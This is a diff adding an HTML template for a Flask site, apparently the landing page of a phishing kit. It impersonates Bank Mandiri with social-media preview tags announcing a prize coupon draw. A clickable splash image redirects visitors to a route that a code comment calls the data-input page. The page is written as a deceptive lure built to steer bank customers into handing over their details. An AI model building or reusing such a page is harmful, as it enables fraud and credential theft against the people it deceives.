@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta property="og:title" content="bank Mandiri" />
+        <meta property="og:description" content="segera cetak kupon undian Anda dan raih kesempatan memenangkan hadiah menarik dari mandiri. promo berlaku terbatas." />
+        <meta property="og:image" content="https://i.imgur.com/Q1917pI.jpg" />
+        <meta name="twitter:card" content="summary_large_image" />
+        <title>Cetak Kupon</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+            }
+            html, body {
+                margin: 0;
+                padding: 0;
+                overflow-y: auto;
+            }
+        </style>
+    </head>
+    <body>
+        <img src="{{ url_for('static', filename='b1.jpg') }}" onclick="masuk()" style="width: 100%; display: block; cursor: pointer;" alt="Splash Image">
+
+        <script>
+            function masuk() {
+            window.location.href = "/halaman2"; // pastikan route /halaman2 mengarah ke halaman input data
+            }
+        </script>
+    </body>
+</html>
